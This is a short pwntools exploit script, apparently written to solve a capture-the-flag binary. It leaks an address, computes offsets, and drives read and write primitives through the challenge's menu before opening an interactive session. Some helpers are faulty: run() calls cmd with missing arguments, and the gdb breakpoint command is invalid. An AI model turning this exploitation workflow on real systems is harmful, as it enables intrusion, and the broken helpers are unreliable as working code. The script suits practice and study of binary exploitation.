from pwn import *
context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
p=process('./challenge')
ru         = lambda a:     p.readuntil(a)
r         = lambda n:        p.read(n)
sla     = lambda a,b:     p.sendlineafter(a,b)
sa         = lambda a,b:     p.sendafter(a,b)
sl        = lambda a:     p.sendline(a)
s         = lambda a:     p.send(a)
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
def cmd(req,addr,data,c=1):
    sla(b"?\n",hex(req).encode())
    sla(b"?\n",hex(addr).encode())
    sla(b"?\n",hex(data).encode())
    
def run(c):
    cmd(1)
    sla(b"> ",c)
gdb.attach(p,'''
set follow-fork-mode parent
bof *0x145D
''')
cmd(3,0,0)
ru("rned ")
base = int(p.readline()[:-1],16)-0x271040
warning(hex(base))
env = 0x221200+base

sla(b"?\n",str(1).encode())
data =0x232000 +base-0x200
warning(hex(data))
cmd(0xc,0,data)

sla(b"?\n",str(1).encode())
cmd(0x5,data,data)

# gdb.attach(p)
p.interactive()